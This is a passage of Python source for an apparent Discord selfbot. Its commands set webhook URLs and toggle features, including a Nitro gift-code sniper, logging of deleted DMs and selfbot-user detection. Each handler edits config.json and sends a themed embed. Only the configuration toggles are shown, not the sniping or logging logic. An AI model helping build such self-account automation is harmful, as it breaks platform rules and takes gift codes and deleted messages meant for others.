            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Watcher Webhook', description='Watcher Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Watcher Webhook URL set.'
            await ctx.send(msg)
            
    @React.command(usage="wdmdels <URL>", description="Set DM deletions webhook URL")
    async def wdmdels(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['dm_delete_notify_webhook_url'] = url
        dm_delete_notify_webhook_url = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'DM Deletions Webhook', description='DM Deletions Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'DM Deletions Webhook URL set.'
            await ctx.send(msg)
            
    @React.command(usage="wsbdetection <URL>", description="Set Selfbot Detection webhook URL")
    async def wsbdetection(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['selfbot_detection_webhook'] = url
        selfbot_detection_webhook = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Detection Webhook', description='Selfbot Detection Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Selfbot Detection Webhook URL set.'
            await ctx.send(msg)

    @React.command(usage="deletecommands", description="Toggle deleting command invoke message")
    async def deletecommands(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['delete_commands'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['delete_commands'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Delete Commands', description='Deleting commands after usage `enabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

                
        elif json.load(open('config.json', encoding='utf-8'))['delete_commands'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['delete_commands'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Delete Commands', description='Deleting commands after usage `disabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

                
        set_vars()

    @React.command(aliases=['nsniper'], usage="nitrosniper", description="Toggles Nitro sniping")
    async def nitrosniper(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['nitro_sniper'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_sniper'] = True
            nitro_sniper = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Sniper', description='Sniping Nitro codes `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Sniping Nitro codes `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['nitro_sniper'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_sniper'] = False
            nitro_sniper = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Sniper', description='Sniping Nitro codes `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Sniping Nitro codes `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(aliases=['nbeep'], usage="nitrobeep", description="Toggles Nitro beep")
    async def nitrobeep(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['nitro_beep'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_beep'] = True
            nitro_beep = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Beep', description='Nitro Beep `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Nitro Beep `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['nitro_beep'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_beep'] = False
            nitro_beep = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Beep', description='Nitro Beep `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Nitro Beep `disabled`'
                await ctx.send(msg)
        
    @React.command(aliases=['ftimestamp'], usage="footertimestamp", description="Enables/Disables the footer timestamp")
    async def footertimestamp(ctx):
        
        if json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['footer_timestamp'] == False:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['footer_timestamp'] = True
            footer_timestamp = True
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Footer Timestamp', description='Footer Timestamp `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Footer Timestamp `enabled`'
                await ctx.send(msg)
                
        elif json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['footer_timestamp'] == True:
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['footer_timestamp'] = False
            footer_timestamp = False
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Footer Timestamp', description='Footer Timestamp `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Footer Timestamp `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(aliases=['sbdetection'], usage="selfbotdetection", description="Toggles Selfbot user detection")
    async def selfbotdetection(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['selfbot_user_detection'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['selfbot_user_detection'] = True
            selfbot_user_detection = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Detection', description='Detecting Selfbot users `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting Selfbot users `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['selfbot_user_detection'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['selfbot_user_detection'] = False
            selfbot_user_detection = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Detection', description='Detecting Selfbot users `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting Selfbot users `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(usage="serverbandetection", description="Toggles server ban detection")
    async def serverbandetection(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['server_ban_detection'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['server_ban_detection'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Ban Detection', description='Detecting Server bans `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting Server bans `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['server_ban_detection'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['server_ban_detection'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Ban Detection', description='Detecting Server bans `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting Server bans `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="ticketdetection", description="Toggles ticket detection")
    async def ticketdetection(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ticket_detection'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ticket_detection'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Tickets Detection', description='Detecting tickets `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting tickets `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ticket_detection'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ticket_detection'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ticket Detection', description='Detecting tickets `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting tickets `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="relationshipdetection", description="Toggles relationship update detection")
    async def relationshipdetection(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['relationship_detection'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['relationship_detection'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Relationship Detection', description='Detecting relationship updates `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
